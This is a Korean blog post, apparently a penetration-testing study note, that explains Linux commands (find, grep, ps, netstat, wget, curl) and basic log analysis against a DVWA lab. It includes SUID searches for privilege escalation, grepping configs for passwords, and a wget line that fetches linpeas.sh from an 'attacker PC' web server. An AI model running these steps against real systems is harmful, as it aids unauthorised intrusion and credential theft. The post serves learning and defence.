---
layout: post
title: "리눅스 명령어 공부"
date: 2025-09-02 17:00:00 +0900
categories: [시스템 해킹]
---

### 1. 개요

침투 테스트 및 보안 분석 과정에서 리눅스 명령어는 기본적인 도구로 활용된다. 시스템 정보 수집, 서비스 확인, 스크립트 준비 등 다양한 작업이 터미널을 통해 이루어진다.

---

### 2. 파일 및 텍스트 처리

*   **find**: 특정 조건의 파일을 검색한다. 권한 상승의 단서가 되는 SUID 설정 파일이나 설정 오류가 의심되는 파일을 찾을 때 유용하다.
    *   **주요 옵션:**
        *   `-perm`: 특정 권한을 가진 파일을 검색한다. (`-u=s`, `-4000`은 SUID)
        *   `-name`: 특정 이름 패턴을 가진 파일을 검색한다.
        *   `-type`: 파일의 종류를 지정한다. (`f`: 파일, `d`: 디렉터리)
    ```bash
    # 루트 디렉터리부터 SUID 비트가 설정된 파일을 검색하고 권한 오류는 출력하지 않음
    find / -perm -u=s -type f 2>/dev/null
    ```
*   **grep**: 파일이나 파이프라인 출력에서 특정 문자열 패턴을 필터링한다. 로그 파일 분석이나 설정 파일에서 민감 정보를 찾을 때 사용된다.
    *   **주요 옵션:**
        *   `-r`: 지정된 디렉터리의 하위 폴더까지 재귀적으로 검색한다.
        *   `-i`: 대소문자를 구분하지 않고 검색한다.
        *   `-v`: 특정 패턴을 제외한 모든 라인을 출력한다.
    ```bash
    # 웹 서버 설정 파일 디렉터리부터 'password' 문자열을 하위 폴더까지 검색
    grep -r "password" /etc/apache2/
    ```

---

### 3. 프로세스 및 네트워크 확인

*   **ps**: 현재 시스템에서 동작하고 있는 프로세스의 목록을 보여준다. 이를 통해 시스템 권한으로 실행되는 비정상적인 프로세스를 확인할 수 있다.
    *   **주요 옵션 조합 `aux`:**
        *   `a`: 다른 사용자의 프로세스도 보여준다.
        *   `u`: 사용자 중심의 포맷으로 출력한다.
        *   `x`: 터미널에 연결되지 않은 프로세스(데몬 등)도 보여준다.
    ```bash
    # 시스템에서 실행 중인 모든 프로세스를 상세 정보와 함께 보여줌
    ps aux
    ```
*   **netstat**: 현재 시스템에서 열려 있는 포트와 네트워크 연결 상태를 보여준다. 최신 시스템에서는 `ss` 명령어가 더 빠른 성능을 보인다.
    *   **주요 옵션 조합 `tulpn`:**
        *   `t`: TCP 포트를 보여준다.
        *   `u`: UDP 포트를 보여준다.
        *   `l`: 연결 대기(Listen) 상태의 포트만 보여준다.
        *   `p`: 해당 포트를 사용하는 프로세스의 이름과 PID를 보여준다.
        *   `n`: 호스트 이름 대신 IP 주소로 보여준다.
    ```bash
    # 리스닝 중인 모든 TCP/UDP 포트와 해당 포트를 사용하는 프로세스 정보를 보여줌
    netstat -tulpn
    ```

---

### 4. 원격 데이터 전송

*   **wget**: 원격 서버의 파일을 다운로드하여 저장한다. 공격자 PC의 웹 서버에서 권한 상승 진단 스크립트(`linpeas.sh` 등)를 공격 대상 서버로 옮길 때 사용된다.
    *   **주요 옵션:**
        *   `-q`: 다운로드 과정을 출력하지 않는다 (Quiet).
        *   `-O <file>`: 다운로드한 내용을 지정된 파일 이름으로 저장한다. (`-O -`는 표준 출력으로 보냄)
    ```bash
    # 공격자 PC(192.9.200.12)에서 실행 중인 웹 서버로부터 linpeas.sh를 다운로드
    wget http://192.9.200.12:8000/linpeas.sh
    ```
*   **curl**: URL을 통해 데이터를 전송하고 그 결과를 터미널에 직접 출력한다. 파일 저장 없이 API 응답을 확인하거나 웹 페이지 소스를 분석할 때 유용하다.
    *   **주요 옵션:**
        *   `-X <METHOD>`: `GET`, `POST` 등 HTTP 메서드를 지정한다.
        *   `-d <data>`: `POST` 요청 시 전송할 데이터를 지정한다.
    ```bash
    # DVWA 로그인 페이지에 POST 요청을 보내고 응답을 확인
    curl -X POST -d "username=admin&password=password&Login=Login" http://192.9.200.11/login.php
    ```

### 5. 기본 로그 분석

시스템에 남겨진 로그 파일을 분석하여 공격 시도나 비정상적인 활동을 탐지할 수 있다. `grep`, `tail`과 같은 명령어는 대량의 로그에서 유의미한 정보를 필터링하는 데 사용된다.

#### **주요 로그 파일 (Ubuntu 기준)**
*   `/var/log/auth.log`: 사용자 로그인, `sudo` 명령어 사용 등 인증 관련 기록.
*   `/var/log/apache2/access.log`: 웹 서버 접속 기록.

#### **로그 분석 예시**
*   **SSH 로그인 실패 기록 확인:**
    `/var/log/auth.log` 파일에서 "Failed password" 문자열을 검색하여 무차별 대입 공격 시도를 탐지한다.
    ```bash
    grep "Failed password" /var/log/auth.log
    ```
*   **특정 IP의 웹 서버 접근 기록 확인:**
    `access.log`에서 특정 IP(`192.9.200.12`)의 접근 기록을 필터링한다.
    ```bash
    grep "192.9.200.12" /var/log/apache2/access.log
    ```

이러한 로그 분석은 [A09: 보안 로깅 및 모니터링 실패](https://hamap0.github.io/projects/owasp-top-10/2025/09/02/A09_Security-Logging-and-Monitoring-Failures.html) 프로젝트에서 로그의 중요성을 이해하는 기반이 된다.

<hr class="short-rule">